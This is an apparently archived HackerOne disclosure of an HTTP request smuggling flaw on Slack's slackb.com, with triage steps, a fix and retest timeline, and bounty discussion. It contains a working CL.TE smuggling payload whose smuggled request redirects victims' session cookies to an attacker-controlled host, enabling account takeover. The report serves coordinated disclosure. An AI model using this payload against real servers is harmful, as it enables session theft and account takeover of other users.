---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
  - impact/account-takeover
  - impact/credential-theft
  - trigger/session-cookie
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-03-12
submitted: 2019-11-14T00:07:59.113Z
bounty_usd: null
votes: 870
cve: []
program: "[[programs/slack|Slack]]"
reporter: "defparam"
source: "https://hackerone.com/reports/737140"
title: "Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies"
---
# Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 870 | **Program:** Slack | **Disclosed:** 2020-03-12

- Report: [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
- CWE: HTTP Request Smuggling
- Submitted: 2019-11-14T00:07:59.113Z

## Report summary

This researcher exploited an HTTP Request Smuggling bug on a Slack asset to perform a CL.TE-based hijack onto neighboring customer requests. This hijack forced the victim into an open-redirect that forwarded the victim onto the researcher's collaborator client with slack domain cookies. The posted cookies in the customer request on the collaborator client contained the customer's secret session cookie. With this attack the researcher was able to prove session takeover against arbitrary slack customers.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Slack Security Team!

My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.

The bug chain is as follows:
1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com`
2) Request Hijack forces victim HTTP requests to instead use `GET https://<URL> HTTP/1.1` on `slackb.com`
3) A request of `GET https://<URL> HTTP/1.1` on the backend server socket results in a 301 redirect to `https://<URL>` with slack cookies (most importantly the `d` cookie)
4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack
5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions

So let's start from the beginning. I was running `smuggler -u https://slackb.com` running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (see below)

{F633736}

The `space1` tests checks for HTTP desync with the following payload:

{F633737}

This testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the `Transfer-Encoding: chunked` header (specified in some abnormal way) and the `Content-Length: ` header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The `space1` payload places a space character in between `Transfer-Encoding` and the colon `:`. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.

One popular attack with a CLTE is to prepend data to the next request that would "erase" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the `slackb.com` attack. The best way I can explain it is through Visio using these diagrams (see below)

{F633741}

Explanation of the malicious request:

{F633743}

Here are your steps to triage:
1) Open up a fresh Burp
2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client`
3) In the Collaborator Client click on `Copy to clipboard` for the server URL
4) Go to the Repeater tab
5) Add the following payload and replace <URL> with your collaborator URL
```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```
6) Set the repeater target to: `host: slackb.com , Port: 443 (SSL)`  by double clicking on target
7) Press go
8) In the Collaborator window click `Poll now` until you see requests

The attack should roughly look like this:
Burp Repeater:
{F633745}

Collaborator DNS request: (The Victim's IP Address is leaked too!)
{F633746}

The special cookie stolen from this attack:
{F633749}

At this point you just attacked an arbitrary slack customer and have access to her `d` session cookie.
From here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.

I'm happy to help if you have any further questions. Most of my requests have been made using the `User-Agent: Smuggler/v1.0` header, feel free to review traffic logs keying off that.

Have a nice day!
Best,
Evan

## Impact

So it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach. 

I am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.

Best Wishes,
Evan

## Timeline

- **Report Filed**
- **2019-11-14** @bugtriage-ryan: Thank you for your report.

We appreciate your interest in our program! We are looking into this and we will keep you updated when we have additional information.
- **Report Triaged**
- **2019-11-14** @defparam: Thanks @maxfeldman!

Sounds like you guys have everything you need, but let me know and I'll be happy to assist on re-testing any fixes you place. This definitely was my coolest smuggling-based bugchain to date. 

Cheers,
Evan
- **2019-11-14** @maxfeldman: Hey @defparam!

We believe we've patched this issue - would you mind retesting your repro steps?

Thanks!
Max
- **2019-11-14** @maxfeldman: Also @defparam - would you mind sharing the IP(s) you used while testing? That will help us with our investigation (and thank you for sharing your user-agent!)
- **2019-11-14** @defparam: Ah, I need to do a better job tracking the IPs I use when performing recon, I sometimes test with my personal IP ███ and sometimes I hop on ProtonVPN NY#11 @ ███ and I may have been using some ProtonVPN Portugal addresses @ ██████████

For the retest i'll be using the custom user-agent and my personal IP. I'll replay back when complete... one moment
- **2019-11-14** @maxfeldman: @defparam thank you! No worries at all, that's very helpful!
- **2019-11-14** @defparam: Automated Retest:
{F634776}
Manual Retest:
{F634777}

Great fix! https://slackb.com/ passed green OK on all my tests including the vulnerable one
I also did a manual test to make sure everything is good. I now see the invalid header name error :)

Optionally for defense in depth I would recommend (in the event I or another attacker finds a new payload to desync the servers) to take special care of those 301 redirects on the backend server. One of the things I struggle with as an attacker is that I can find desync on different servers but finding that secondary bug is like walking around in the dark and can be difficult.

Anyway, awesome fast fix! It was great working with you.

Best,
Evan
- **Bounty Awarded**
- **2019-11-15** @defparam: Branden, @maxfeldman and the rest of the @Slack Security team,

Thank you! I did not expect that level of bounty. Also I did not expect for this finding to go from submit to fix/bounty in a matter of 24 hours. That truly is top notch security work and is a new record for me. You guys are an awesome team. Best wishes and looking forward to working with you all in the future.

Best,
Evan

P.S. What are your thoughts on a redacted published disclosure? I would love to have some credibility as a HackerOne newbie (would be my first disclosure) and it would promote your Bounty Promotion month :) - these bugs are rather sensitive so I can understand your decision either way. Thanks!
- **2019-11-15** @maxfeldman: Hey Evan,

Thank you! We're excited to see future findings! Re: disclosure - a redacted disclosure will be fine, but we'll need to hold off for a little bit while we perform our investigation. We'll keep you updated in the meantime, and once we've concluded there wasn't a customer impact we can disclose this. Thanks for your patience!

Best,
Max
- **2019-11-15** @defparam: Thanks Max!

No worries, take your time.

Best,
Evan
- **2020-02-13** @defparam: Hey @maxfeldman ,

How are things? It's been 90 days since initial disclosure of this report. I was curious as to the state of this report internally and if it can be resolved? Also after resolve I am still interested in a summary-only disclosure (added my summary up above), I also wouldn't mind renaming the report to something less dramatic like: "Stolen session cookies using HTTP Request Smuggling against https://<redacted>/"

Thanks!
Evan
- **Report Resolved**
- **2020-03-11** @bugtriage-josh: Hey @defparam 

I checked with the team, and you should be good to request disclosure on this one though HackerOne.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
